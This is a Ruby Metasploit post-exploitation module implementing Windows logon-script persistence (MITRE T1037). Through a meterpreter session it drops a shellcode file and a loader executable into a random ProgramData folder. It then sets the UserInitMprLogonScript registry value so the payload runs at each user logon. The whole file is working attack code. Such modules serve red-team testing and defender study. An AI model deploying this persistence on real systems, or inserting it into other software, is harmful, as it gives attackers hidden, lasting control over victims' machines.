##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv


  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Logon Scripts (T1037) Windows - VIPER',
                      'Description'   => %q{
                          Persistence, Lateral Movement:
                          Windows allows logon scripts to be run whenever a specific user or group of users log into a system. The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.},
                      'License'       => MSF_LICENSE,
                      'Author'        => ['Praetorian'],
                      'References'    => [['URL', 'https://attack.mitre.org/wiki/Technique/T1037']],
                      'Platform'      => ['win'],
                      'Targets'       => [['Windows', {}]],
                      'SessionTypes'  => ['meterpreter'],
                      'DefaultTarget' => 0,
          ))
    register_options(
            [
                    OptString.new('REMOTE_EXE_PATH', [false, 'The remote victim exe path to run. Use temp directory as default. ']),
            ])
  end


  def exploit

    unless session.type == "meterpreter"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end


    if datastore['PAYLOAD'].include?(ARCH_X64)
      data_exe_file = "loader_x64.exe"
    else
      data_exe_file = "loader_x86.exe"
    end

    vprint_status("Running module against #{sysinfo['Computer']}")

    @loader_file    = "loader.exe"
    @shellcode_file = "loader.ini"

    @storedir = create_store_rand_dir()
    if @storedir == nil
      pub_json_result(false,
                      'Create rand dir failed',
                      nil,
                      self.uuid)
      return
    end

    buf            = create_payload
    shellcode_path = @storedir + "\\" + @shellcode_file
    write_file_to_target(shellcode_path, buf)

    @victim_path = @storedir + "\\" + @loader_file
    bin          = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_dll', data_exe_file))
    write_file_to_target(@victim_path, bin)

    unless session.fs.file.exist? shellcode_path and session.fs.file.exist? @victim_path
      pub_json_result(false,
                      'write loader to storedir failed,maybe permission or AV',
                      nil,
                      self.uuid)
      return
    end


    reg_base_key = "HKCU\\Environment"
    reg_base_val = "UserInitMprLogonScript"
    unless registry_key_exist?reg_base_key
      unless registry_createkey(reg_base_key)
        pub_json_result(false,
                        'crete registry failed',
                        nil,
                        self.uuid)
      end
    end
    # add the logon script
    if registry_setvaldata(reg_base_key, reg_base_val, @victim_path, "REG_SZ")
      vprint_good("Success! To test persistence, log out and then log in.")
      pub_json_result(true,
                      nil,
                      @victim_path,
                      self.uuid)
      return
    else
      pub_json_result(false,
                      'write registry failed',
                      nil,
                      self.uuid)
    end

  end


  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, 'hex', 'buf')
  end

  def create_store_rand_dir()
    dirname     = Rex::Text.rand_text_alpha(10)
    fulldirname = session.sys.config.getenv('ProgramData') + "\\" + dirname
    session.fs.dir.mkdir(fulldirname)
    if session.fs.file.exist? fulldirname
      vprint_good("create storedir : #{fulldirname}")
      return fulldirname
    else
      vprint_error("create storedir failed : #{fulldirname}")
      return nil
    end
  end

  def write_file_to_target(filepath, filedata)
    fd = session.fs.file.new(filepath, "wb")
    fd.write(filedata)
    fd.close
  end
end
